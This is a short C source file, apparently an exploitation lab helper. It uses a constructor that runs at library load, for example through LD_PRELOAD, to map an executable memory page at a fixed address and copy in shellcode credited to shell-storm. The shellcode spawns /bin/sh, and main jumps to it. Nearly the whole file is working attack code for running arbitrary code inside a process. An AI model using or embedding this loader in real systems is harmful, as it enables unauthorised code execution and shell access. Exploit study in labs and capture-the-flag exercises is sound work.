#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

// LD_PRELOAD
// LD_LOAD_LIBRARY=.

// orig: http://shell-storm.org/shellcode/files/shellcode-811.php
const char shellcode[] =
   "\x90\x90\x90\x90\x90\x90\x90"
   "\x31\xc0\x50\x68\x2f\x2f\x73"
   "\x68\x68\x2f\x62\x69\x6e\x89"
   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
   "\xcd\x80\x31\xc0\x40\xcd\x80";

char *addr;
void map_shellcode() __attribute__((constructor)); // Called at library load

void map_shellcode(){
    addr = (char *) mmap((void *) 0x600000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (addr == MAP_FAILED)
        perror("mmap");
    memcpy(addr, shellcode, sizeof(shellcode));
    printf("[*] mmapped shellcode at %p\n", addr);
}

void spawn_shell(){
    (*(void(*)()) addr)();
}

int main(){
    spawn_shell();
}